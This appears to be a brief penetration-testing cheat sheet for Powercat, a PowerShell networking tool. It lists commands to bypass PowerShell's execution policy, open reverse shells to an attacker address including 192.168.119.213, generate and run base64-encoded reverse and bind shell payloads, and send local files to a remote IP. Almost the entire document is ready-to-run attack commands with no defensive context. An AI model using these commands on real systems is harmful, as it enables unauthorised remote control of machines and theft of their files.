# Powercat

Load powercat

```powershell
Set-ExecutionPolicy Bypass
. .\powercat.ps1
```

Reverse shell

```powershell
powercat -c <attack system> -p 8044 -e cmd.exe
```

Encoded Reverse shell

```powershell
powercat -c 192.168.119.213 -p 8044 -e cmd.exe -ge > reverse.ps1
powershell -E (Get-Content 'reverse.ps1' -Raw)   				# Execute reverse shell
```

Bind shell

```powershell
powercat -l -p 443 -e cmd.exe
```

Encoded Bind shell

```powershell
powercat -l -p 443 -e cmd.exe -ge > bind.ps1
powershell -E (Get-Content 'bind.ps1' -Raw)
```

Sending files

```powershell
powercat -c <remote ip> -p 443 -i C:\<path>\<filename>
```

